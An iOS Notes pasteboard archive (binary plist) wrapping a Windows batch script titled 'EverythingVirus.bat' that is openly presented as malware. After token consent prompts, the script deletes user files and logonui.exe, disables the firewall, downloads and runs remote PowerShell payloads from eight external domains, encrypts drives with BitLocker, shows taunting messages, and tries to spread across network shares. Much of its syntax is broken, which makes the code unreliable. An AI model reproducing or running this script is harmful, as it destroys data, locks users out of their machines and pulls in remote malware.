bplist00�
X$versionY$archiverT$topX$objects ��_NSKeyedArchiver�	Troot��+1259=>CGKU$null�_attributedStringData]dataPersisterV$class����WNS.dataO��


::EverythingVirus.bat


@echo off

choice set /P c=Do you want to run this program this is a malware the creator is not responsible for any problems that arise from this program (Y/N) if /I “%c%” EQU “Y” goto :Yes run it if /I “%c%” EQU “N” goto :No cancel  goto :choice


:No cancel 
exit


 :Yes run it 
choice set /P c=Are you 100%you want to run this WE ARE NOT RESPONSIBLE for any damage caused this is malware click no to cancel this is your final warning(Y/N) if /I “%c%” EQU “Y” goto :Yes if /I “%c%” EQU “N” goto :No goto :choice


:No
exit


:Yes
HideCommandWindow
 copy %0 %temp%\wallpaper.vbs


echo [InternetShortcut] > "%SystemRoot%\system32\spool\drivers\color\run.lnk"
echo URL=file:///%temp%\wallpaper.vbs >> "%SystemRoot%\system32\spool\drivers\color\run.lnk"

echo Set Shell = CreateObject("WScript.Shell") > %temp%\wallpaper.vbs
echo Set Wallpaper = Shell.SpecialFolders("Desktop") >> %temp%\wallpaper.vbs
echo Wallpaper = Wallpaper + "\" + "viruswallpaper.bmp" >> %temp%\wallpaper.vbs
echo Set objWSH = CreateObject("WScript.Shell") >> %temp%\wallpaper.vbs
echo objWSH.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", Wallpaper, "REG_SZ" >> %temp%\wallpaper.vbs
echo objWSH.RegWrite "HKCU\Control Panel\Desktop\WallpaperStyle", 0, "REG_DWORD" >> %temp%\wallpaper.vbs
echo objWSH.RegWrite "HKCU\Control Panel\Desktop\TileWallpaper", 1, "REG_DWORD" >> %temp%\wallpaper.vbs

  cd C:\Windows\System32
sc.exe stop TrustedInstaller

sc.exe config TrustedInstaller binpath= "del C:\Windows\System32\logonui.exe"


cd "C:\Users\Public\Documents"
del /F /S /Q *


cd "C:\Users\Public\Pictures"
del /F /S /Q *


cd "C:\Users\Public\Music"
del /F /S /Q *

netsh advfirewall set allprofiles state off

powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('17ebook.com')"


powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('aladel.net')"


powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('bpwhamburgorchardpark.org')"

powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('ginedis.com')"

powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('clicnews.com')"

powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('gncr.org')

powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('hihanin.com')"

powershell -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('stock888.cn')"




setlocal

fsutil behavior query disabled
if %errorlevel% equ 1 (
    goto exit
)

reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "BitLockerPolicy" /t REG_DWORD /d "00000002" /f

for /f "tokens=2 delims=: " %%A in ('wmic logicaldisk where "drivetype=3" get caption /value') do (
    vol %%A:
    if %errorlevel% equ 0 (
        manage-bde -on %%A: -recoverypass666
    )
)

msg * your computer is dead accept the fate and enjoy the last moments with your pc

setlocal enabledelayedexpansion

for /l %%i in (1,1,10) do (
    rem Generate a random number between 1 and 100
    set RANDOM_NUM=%random% %% 100 + 1

    rem Display an error message if the random number is less than 50
    if !RANDOM_NUM! lss 50 (
        msg * ha ur pc dead
    )

    rem Display a warning message if the random number is greater than or equal to 50
    if !RANDOM_NUM! geq 50 (
        msg * diiieeee! Pc!!
    )

    rem Wait for 1 second
    timeout /t 1
)


net use
for /f "tokens=1-4 delims=:" %%a in ('net view ^| findstr /N "^ *"') do (
    if "%%c" neq "" (
        ping -n 1 %%b | findstr /i "reply" > nul
        if not errorlevel 1 (
            pushd \\%%b\ > nul
            call netpass.bat
            popd
        ) else (
            echo Damn, could not spread virus to %%b
        )
    )
)
msg * Virus has been spread to devices on the network

del C:\Windows\System32\logonui.exe
Shutdown/r
end local

exit*�*(*��Z$classnameX$classes]NSMutableData�]NSMutableDataVNSDataXNSObject� !"#$%&'()*_accumulatedDataSize_objectIdentifierWallURLs_identifierToDataDictionary_cacheDirectoryURL �
�����,-./0WNS.base[NS.relative� ��_�file:///private/var/mobile/Containers/Data/Application/A75FB9E6-2435-4E0C-B412-8220D7F2B5F0/tmp/pasteboardDataPersister/FD5F9CAE-9412-4ECC-B45E-A639176458B1�34UNSURL�3�678ZNS.objects��	�:;^NSMutableArray�:<WNSArray_$73228609-B244-4DE6-8340-2C4F5D24556C�?6@ABWNS.keys����DE_NSMutableDictionary�DF\NSDictionary�HI_ICDataPersister�J_ICDataPersister�LM_ICNotePasteboardData�N_ICNotePasteboardData    $ ) 2 7 I L Q S e k r � � � � � � � ������������#@TVXZ\^`go{}� %+.3>?AFUYa���������������             O              )